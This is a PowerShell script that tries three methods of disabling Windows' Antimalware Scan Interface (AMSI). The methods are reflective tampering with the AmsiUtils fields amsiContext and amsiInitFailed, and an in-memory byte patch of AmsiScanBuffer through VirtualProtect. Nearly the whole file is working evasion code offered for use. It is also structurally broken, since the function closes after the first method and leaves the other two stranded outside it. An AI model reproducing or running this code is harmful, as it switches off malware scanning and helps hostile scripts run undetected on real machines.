# amsi-bypass.ps1 - Multiple AMSI bypass attempts
function Bypass-AMSI {
    Write-Host "[+] Attempting AMSI Bypass..." -ForegroundColor Yellow



    # Method 1: Alternative reflective
    try {
        [Runtime.InteropServices.Marshal]::WriteInt32([Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiContext','NonPublic,Static').GetValue($null),0x0)
        Write-Host "[+] AMSI Bypass 1: Success" -ForegroundColor Green
        return $true
    } catch {
        Write-Host "[-] AMSI Bypass 1: Failed" -ForegroundColor Red
    }
    
    return $false
}


    # Method 2: Reflective bypass
    try {
        [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
        Write-Host "[+] AMSI Bypass 2: Success" -ForegroundColor Green
        return $true
    } catch {
        Write-Host "[-] AMSI Bypass 2: Failed" -ForegroundColor Red
    }
    
    # Method 3: Memory patch
    try {
        $MethodDefinition = @"
using System;
using System.Runtime.InteropServices;
public class AMSIPatch {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
    public static void PatchAMSI() {
        IntPtr lib = LoadLibrary("amsi.dll");
        IntPtr addr = GetProcAddress(lib, "AmsiScanBuffer");
        uint oldProtect;
        VirtualProtect(addr, (UIntPtr)5, 0x40, out oldProtect);
        byte[] patch = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
        Marshal.Copy(patch, 0, addr, 6);
    }
}
"@
        Add-Type $MethodDefinition
        [AMSIPatch]::PatchAMSI()
        Write-Host "[+] AMSI Bypass 3: Success" -ForegroundColor Green
        return $true
    } catch {
        Write-Host "[-] AMSI Bypass 3: Failed" -ForegroundColor Red
    }
    
    

# Execute the bypass
if (Bypass-AMSI) {
    Write-Host "[+] AMSI successfully bypassed!" -ForegroundColor Green
} else {
    Write-Host "[-] All AMSI bypass attempts failed" -ForegroundColor Red
}

